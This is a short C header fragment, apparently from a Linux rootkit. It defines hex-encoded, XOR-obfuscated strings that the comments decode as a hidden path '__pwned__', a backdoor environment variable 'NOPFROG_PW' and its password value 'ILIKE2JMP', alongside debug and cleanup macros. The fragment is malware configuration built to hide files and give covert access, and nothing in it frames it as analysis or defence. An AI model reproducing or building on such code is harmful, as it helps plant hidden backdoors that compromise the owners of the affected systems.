#define _GNU_SOURCE
#define _LARGEFILE_SOURCE 1

#ifdef DEBUG
#define DEBUG_MSG(...) fprintf(stderr, __VA_ARGS__);
#else
#define DEBUG_MSG(...)
#endif 
#define CLEAN(var) clean(var, strlen(var))

#define HIDDEN_PATH_STR "\x75\x75\x5a\x5d\x44\x4f\x4e\x75\x75" // __pwned__
#define ENV_VAR_NAME "\x64\x65\x7a\x6c\x78\x65\x6d\x75\x7a\x7d" // NOPFROG_PW
#define ENV_VAR_VAL "\x63\x66\x63\x61\x6f\x18\x60\x67\x7a" // ILIKE2JMP